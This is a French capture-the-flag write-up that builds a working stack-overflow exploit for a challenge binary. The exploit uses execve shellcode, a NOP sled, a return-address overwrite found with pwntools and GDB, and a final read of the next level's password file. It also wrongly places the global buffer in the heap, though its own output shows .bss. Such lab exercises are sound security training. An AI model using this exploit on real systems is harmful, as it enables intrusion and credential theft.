## 1. Comprendre la faille

La faille se trouve dans le fait que les `fgets` lisent plus loin que la taille de la variable qu'ils doivent remplir, ce qui va nous permettre de faire un overflow.

Il n'y a pas de shell exécuté directement dans le code, on devra donc passer par un shellcode : `\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80`.

## 2. Préparer la première partie du payload

On va mettre ce shellcode dans la première variable `a_user_name`. C'est une variable globale donc placée dans la heap, c'est un bon endroit pour la mettre car cette adresse ne bougera pas.

On peut construire la première partie du payload.

On commence par `dat_wil` pour passer à la prochaine étape, puis on remplit avec des instructions nulles : `\x90`, et on finit par le shellcode.

Donc la première partie du payload sera ça :

```text
"dat_wil" + "\x90"*227 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

227 car 256 - (21 du shellcode) - (7 caractères de `dat_wil`) = 228 et on retire 1 pour le `\0`.

## 3. Trouver l'adresse cible

Maintenant pour la seconde partie du payload, on va devoir trouver le bon offset pour remplacer EIP et le rediriger vers l'adresse de notre `a_user_name` où on a placé notre shellcode.

Il faut donc trouver l'adresse de `a_user_name` :

```bash
objdump -t level01
...
0804a040 g     O .bss	00000064              a_user_name
...
```

L'adresse de `a_user_name` est : `0x0804a040`.

## 4. Trouver l'offset EIP

Il faut trouver l'offset pour atteindre EIP.

On va utiliser un pattern fourni par la librairie pwntools en Python :

```bash
python -c 'from pwn import *; print(cyclic(200))'
```

Ça donne :

```text
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
```

On lance level1 avec GDB :

```gdb
(gdb) r
(gdb) dat_wil
(gdb) aaaabaaacaaadaaaeaaafaa...
Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
```

On va trouver l'offset grâce au pattern decodeur :

```bash
python -c 'from pwn import *; print(cyclic_find(0x61616175))'
```

Ça nous donne 80.

Il faut donc 80 octets à partir de la variable s pour écrire dans EIP.

## 5. Construire la seconde partie du payload

On a à présent tout ce qu'il faut pour construire la seconde partie du payload :

```text
"e"*80 + "\x40\xa0\x04\x08" (80 caracteres + l'adresse de a_user_name) en little edian
```

Le payload entier sera :

```bash
python -c 'print "dat_wil" + "\x90"*227 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "e"*80 + "\x40\xa0\x04\x08"' > /tmp/payload
cat /tmp/payload - | ./level01
```

On a donc réussi à lancer un shell.

```bash
cat /home/users/level02/.pass
```
